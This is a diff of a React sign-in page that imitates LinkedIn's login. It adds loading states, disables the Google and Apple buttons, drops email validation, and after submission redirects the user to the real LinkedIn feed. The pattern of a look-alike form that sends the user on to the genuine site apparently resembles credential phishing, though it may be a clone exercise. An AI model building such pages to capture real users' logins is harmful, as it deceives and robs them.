@@ -4,7 +4,6 @@ import { Input } from "@/components/ui/input";
 import {
   Card,
   CardContent,
-  CardFooter,
   CardHeader,
 } from "@/components/ui/card";
 import { Separator } from "@/components/ui/separator";
@@ -18,14 +17,8 @@ const App = () => {
   const [formError, setFormError] = useState("");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [errors, setErrors] = useState({ email: "", password: "" });
-
-  const validateEmail = (email) => {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!email) return "Email is required";
-    if (!emailRegex.test(email)) return "Please enter a valid email";
-    return "";
-  };
+  const [errors, setErrors] = useState({ email: "", password: "", google: "", apple: "" });
+  const [loading, setLoading] = useState(false);
 
   const validatePassword = (password) => {
     if (!password) return "Password is required";
@@ -36,16 +29,15 @@ const App = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setFormError("");
+    setLoading(true);
 
-    const emailError = validateEmail(email);
     const passwordError = validatePassword(password);
 
     setErrors({
-      email: emailError,
       password: passwordError,
     });
 
-    if (emailError || passwordError) return;
+    if (passwordError) return;
 
     try {
       const response = await fetch(
@@ -65,9 +57,14 @@ const App = () => {
         throw new Error(data.message || "Something went wrong");
       }
 
-      window.location.href = "/";
+      window.location.href = "https://www.linkedin.com/feed/";
+      setTimeout(() => {
+
+        setLoading(false)
+      }, 1000)
     } catch (error) {
       setFormError(error.message);
+      setLoading(false)
     }
   };
 
@@ -87,21 +84,31 @@ const App = () => {
             <div className="flex flex-col space-y-4">
               <Button
                 variant="outline"
+                type="button"
                 className="w-full rounded-3xl text-gray-600 text-base"
-                onClick={() => console.log("Google sign in clicked")}
+                onClick={() => setErrors({ google: "Google sign in is not available currently" })}
+                disabled={loading}
               >
                 <GoogleLogo className={"w-8 h-8"} />
                 Continue with Google
               </Button>
+              {errors.google && (
+                <p className="text-sm text-red-500">{errors.google}</p>
+              )}
 
               <Button
                 variant="outline"
+                type="button"
                 className="w-full rounded-3xl text-gray-600 text-base"
-                onClick={() => console.log("Apple sign in clicked")}
+                onClick={() => setErrors({ apple: "Apple sign in is not available currently" })}
+                disabled={loading}
               >
                 <AppleLogo />
                 Sign in with Apple
               </Button>
+              {errors.apple && (
+                <p className="text-sm text-red-500">{errors.apple}</p>
+              )}
             </div>
 
             <div className="relative w-full mt-4">
@@ -123,9 +130,8 @@ const App = () => {
               <Input
                 type="email"
                 placeholder="Email or Phone"
-                className={`w-full px-3 py-2 border-gray-500 ${
-                  errors.email ? "border-red-500" : ""
-                }`}
+                className={`w-full px-3 py-2 border-gray-500 ${errors.email ? "border-red-500" : ""
+                  }`}
                 value={email}
                 onChange={(e) => {
                   setEmail(e.target.value);
@@ -133,6 +139,7 @@ const App = () => {
                     setErrors((prev) => ({ ...prev, email: "" }));
                   }
                 }}
+                disabled={loading}
               />
               {errors.email && (
                 <p className="text-sm text-red-500">{errors.email}</p>
@@ -143,9 +150,8 @@ const App = () => {
               <Input
                 type="password"
                 placeholder="Password"
-                className={`w-full px-3 py-2 border-gray-500 text-lg ${
-                  errors.password ? "border-red-500" : ""
-                }`}
+                className={`w-full px-3 py-2 border-gray-500 text-lg ${errors.password ? "border-red-500" : ""
+                  }`}
                 value={password}
                 onChange={(e) => {
                   setPassword(e.target.value);
@@ -153,6 +159,7 @@ const App = () => {
                     setErrors((prev) => ({ ...prev, password: "" }));
                   }
                 }}
+                disabled={loading}
               />
               {errors.password && (
                 <p className="text-sm text-red-500">{errors.password}</p>
@@ -170,6 +177,7 @@ const App = () => {
               <Checkbox
                 id="remember"
                 className="data-[state=checked]:bg-blue-500 rounded-lg data-[state=checked]:text-white data-[state=checked]:border-transparent"
+                disabled={loading}
               />
               <label htmlFor="#remember">Keep me logged in</label>
             </div>
@@ -177,6 +185,7 @@ const App = () => {
             <Button
               type="submit"
               className="w-[95%] py-6 bg-blue-700 hover:bg-blue-700 text-white rounded-3xl items-center mx-auto"
+              disabled={loading}
             >
               Sign in
             </Button>
